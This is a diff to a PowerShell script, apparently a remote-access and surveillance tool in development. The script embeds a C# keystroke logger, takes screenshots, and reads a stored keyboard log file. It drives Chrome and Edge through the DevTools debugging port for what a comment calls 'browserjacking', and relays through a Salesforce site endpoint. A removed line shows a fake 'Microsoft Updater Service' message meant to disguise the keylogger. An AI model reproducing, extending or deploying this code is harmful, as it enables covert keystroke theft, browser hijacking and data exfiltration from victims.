@@ -1,5 +1,10 @@
 Set-Location -LiteralPath (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition)
 
+# tasks for 20260923
+# figure out how to deal with using chrome both for pubnub comm as well as for 
+# browserjacking
+# --> should have two instances running, find
+
 $scriptGuid = '70d8ab8e-fdb2-4076-9fd8-ba81c1be92e3' # Use a unique GUID for each script
 $createdNew = $false
 $script:SingleInstanceEvent = New-Object System.Threading.EventWaitHandle $true, ([System.Threading.EventResetMode]::ManualReset), "Global\$scriptGuid", ([ref] $createdNew)
@@ -25,9 +30,9 @@ Add-Type -AssemblyName System.Drawing
 # --remote-allow-origins=* 
 # --force-devtools-available
 # frontend.appspot.com
-# msedge requires --user-data-dir="%TEMP%\edge-debug-profile" # on tpl, not required
+# msedge requires --user-data-dir="%TEMP%\edge-debug-profile" # on tpl, not required (some pcs, not all)
 
-#region KeystrokeLogger
+# side benefit is that seems to keep ps script running
 Add-Type -TypeDefinition '
 using System;
 using System.Diagnostics;
@@ -102,7 +107,6 @@ public class KeyLogger
 }
 }
 ' -ReferencedAssemblies System.Windows.Forms
-#region
 
 function Get-Identity {
     $ScriptName = "pscdp.relay.ps1"
@@ -163,7 +167,9 @@ function Take-Screenshot() {
 }
 
 function Get-KeyboardLog() {
+    $text = Get-Content -Path "C:\ProgramData\owd\owdkeyboardlog.txt" -Raw
 
+    return $text
 }
 
 $script:msedge_debugport = 9222
@@ -419,7 +425,12 @@ class PSCDP {
 
         $this.targets = $this.GetTargets()
 
-        $this.wsUri = ($this.targets | Select-Object -First 1).webSocketDebuggerUrl
+        # if init page is set, filter using init page
+        if ( ! [string]::IsNullOrEmpty($this.initpage) ) {
+            $this.wsUri = ($this.targets | Where-Object { $_.url -eq $this.initpage } | Select-Object -First 1).webSocketDebuggerUrl
+        } else {
+            $this.wsUri = ($this.targets | Select-Object -First 1).webSocketDebuggerUrl
+        }
         
         return $this.wsUri
     }
@@ -801,6 +812,7 @@ class PSCDP {
         }
         $this.sendQueue.Add( @{ method="Target.setAutoAttach"; params=$params } )
     
+        <#
         if ( [string]::IsNullOrWhiteSpace($this.initpage) ) {
 
             $params = @{
@@ -817,6 +829,7 @@ class PSCDP {
 
             $this.sendQueue.Add( @{ name="navigate_init_page"; method="Target.createTarget"; params=$params } )
         }
+        #>
 
         $this.sendQueue.Add( @{ method="Target.getTargets"; callback=$script:get_targets_action })
 
@@ -861,7 +874,7 @@ class PSCDP {
 $script:clientws = [PSCDP]::new($script:chrome_debugport)
 $script:clientws.ConnectCdp()
 
-$script:pubnubws = [PSCDP]::new($script:msedge_debugport, "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub")
+$script:pubnubws = [PSCDP]::new($script:chrome_debugport, "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub")
 $script:pubnubws.LoadQueue()
 $script:pubnubws.ConnectCdp()
 
@@ -870,7 +883,6 @@ $script:pubnubws.ConnectCdp()
 
 $keyboardlogger = {
     try {
-        Write-Host "Running Microsoft Updater Service, Service Pack Retrieval, do not shut down or restart"
         [PowerShell.KeyLogger]::Main()
     } finally {
         if ($script:SingleInstanceEvent) {
